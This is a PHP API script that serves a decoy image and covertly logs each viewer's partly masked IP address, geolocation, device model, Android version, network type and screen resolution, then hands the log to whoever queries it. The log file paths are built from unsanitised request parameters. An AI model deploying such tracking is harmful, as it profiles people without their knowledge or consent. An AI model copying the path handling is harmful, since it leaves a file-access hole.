<?php
/* Start */
require ("../function.php"); // 引入函数文件
addApiAccess(90); // 调用统计函数
addAccess();//调用统计函数*/

require ('../../need.php');//引用封装好的函数文件
//require ('anquan.php');//引入安全文件

/* End */

$JPG = need::teacher_curl('http://ovooa.com/API/loveanimer/?screen=&format=2&type=url');
$ppp = (String)@$_REQUEST["a"];
$type = (String)@$_REQUEST["type"];
if($type=="1"){
	preg_match('/(.*)b/',$ppp,$a);
	preg_match('/b(.*)/',$ppp,$b);
	$a=$a[1];
	$b=$b[1];
	$ip = need::userip();//$_SERVER["REMOTE_ADDR"]; 
	$se = json_decode(need::teacher_curl("http://opendata.baidu.com/api.php?query=".$ip."&co=&resource_id=6006&t=1433920989928&ie=utf8&oe=utf-8&format=json"),true);
	$df = $se["data"][0]["location"];
	preg_match('/(.*)\.(.*)\.(.*)\.(.*)/',$ip,$ip);
	$ip = $ip[1].".".$ip[2].".".$ip[3].".***";
	$pi = $_SERVER['HTTP_USER_AGENT'];
	preg_match_all("/NetType\/(.*?) /",$pi,$wl);
	if($wl[1][0]==""){
		$wl="";
	}else{
		$wl= "\n网络类型：".$wl[1][0];//网络类型
	}
	preg_match_all("/Pixel\/(.*?) /",$pi,$fbl);
	if($fbl[1][0]==""){
		$fbl="";
	}else{
		$fbl= "\n分辨率：".$fbl[1][0]."P";
	}
	preg_match_all("/\(Linux; U; (.*?); (.*?)Build\/(.*?)\)/",$pi,$z);
	if($z[1][0]==""){
		$z1="";
	}else{
		$z1= "\n安卓版本：".$z[1][0];
	}
	if($z[2][0]==""){
		$z2="";
	}else{
		$z2= "\n设备名称：".$z[2][0];
	}
	$i=$wl.$z1.$z2.$fbl;
	$cnm ="[".$ip."]\n地址：".$df."".$i."\n";
	$mmp=fopen("./kuiping/".$a.$b.".txt", "a+");
	$file = @file_get_contents("./kuiping/".$a.$b.".txt", "a+");
	if(!stristr($file,$ip)){
		fwrite($mmp, "\n".$cnm."窥屏时间：".date("Y-d-m H:i:s")."\n");
	}
	fclose($mmp);
	header('content-type:image/jpeg');
	need::send('http://ovooa.com/API/dmt/image/'.rand(1,2000).'.jpg','image');
}else{
	if($ppp) {
		preg_match('/(.*)b/',$ppp,$a);
		preg_match('/b(.*)/',$ppp,$b);
		$a = @$a[1];
		$b = @$b[1];
		if($a && $b) {
			$text = @file_get_contents("./kuiping/".$a.$b.".txt");
			header('content-type:application/json');
			echo trim($text);
			@unlink("./kuiping/".$a.$b.".txt");
		} else {
			echo '获取失败';
		}
	} else {
		
	}
}
fastcgi_finish_request();//先返回上面的内容
time_sleep_until(time()+30);//延迟30秒后执行下面的命令
$folder="./kuiping/";
function trash($folder,$time=30){
$ext=array('php','jpg','html','ttf','png'); //带有这些扩展名的文件不会被删除.
$o=opendir($folder);
while($file=readdir($o)){
		if($file !='.' && $file !='..' && !in_array(substr($file,strrpos($file,'.')+1),$ext)){
				$fullPath=$folder.'/'.$file;
				if(is_dir($fullPath)){
						trash($fullPath);
						@rmdir($fullPath);
				} else {
						if(time()-filemtime($fullPath) > $time){
								unlink($fullPath);
								}
						}
				}
		}
		closedir($o);
}
trash('./kuiping/');//调用自定义函数
?>